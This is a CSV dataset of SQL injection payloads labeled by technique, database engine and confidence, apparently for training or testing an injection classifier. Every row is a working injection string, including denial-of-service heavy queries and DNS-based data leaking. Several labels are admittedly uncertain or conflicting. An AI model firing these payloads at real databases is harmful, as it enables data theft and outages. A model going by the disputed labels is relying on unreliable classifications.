id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20544,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' detected → union_based (P7); classic column exfiltration structure",3
20545,"select count ( * ) from generate_series ( 1,5000000 ) and 'fahy' like 'fahy",heavy_query,postgresql,0.9,"Pattern match: 'generate_series(1,5000000)' → PostgreSQL heavy_query (P4); DoS via Cartesian product",3
20546,"1"" ) ) as dcrk where 5164 = 5164 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.8,"Pattern match: 'sysusers' table joins + boolean context; rule suggests boolean_blind but payload structure has Cartesian joins (P4 vs P3)",2
20547,-8745' ) as xpwv where 8855 = 8855 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.95,"Pattern match: 'utl_inaddr.get_host_address' → Oracle error_based (P4); DNS resolution error injection",2
20548,"1 ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 4858 = 4858",time_blind,sqlite,0.85,"Pattern match: 'randomblob(500000000)' → SQLite time_blind (P5); large blob memory allocation causes delay",2
20549,1 ) where 1203 = 1203 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.75,"UNCERTAIN: 'RLIKE' (P3) vs 'sleep' (P5); rule detects RLIKE, but sleep is stronger signal - prioritizing RLIKE as secondary",2
20550,"-2418'|| ( select 'mdbt' from dual where 3026 = 3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",union_based,oracle,0.85,"Pattern match: 'UNION ALL SELECT' + 'dual' table → Oracle union_based (P7); UNION extraction technique",3
20551,1 where 3357 = 3357 and ( 9492 = 4334 ) *4334--,boolean_blind,generic,0.65,"Pattern match: 'AND number=number' boolean condition → boolean_blind (P3); modifies WHERE logic via arithmetic",2
20552,"1%' ) ) union all select null,null,null#",union_based,generic,0.85,"Pattern match: 'UNION ALL SELECT' null columns → union_based (P7); column count alignment technique",3
20553,"1%"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,heavy_query,postgresql,0.9,"Pattern match: 'generate_series(1,5000000)' Cartesian product → PostgreSQL heavy_query (P4); DoS via enumeration",3
20554,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""%"" = """,boolean_blind,db2,0.8,"Pattern match: 'sysibm.systables' multiple joins + boolean context; Cartesian product detected but labeled boolean_blind",2
20555,"1"" ) ) as tncm where 8203 = 8203 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.8,"Pattern match: 'sysibm.systables' Cartesian joins; priority conflict between boolean_blind (P3) and heavy_query (P4)",2
20556,"1' ) ) ) and make_set ( 6094 = 2929,2929 ) and ( ( ( 'gkyo' = 'gkyo",boolean_blind,mysql,0.65,"Pattern match: 'make_set()' function with boolean condition → MySQL boolean_blind (P3); conditional function result",1
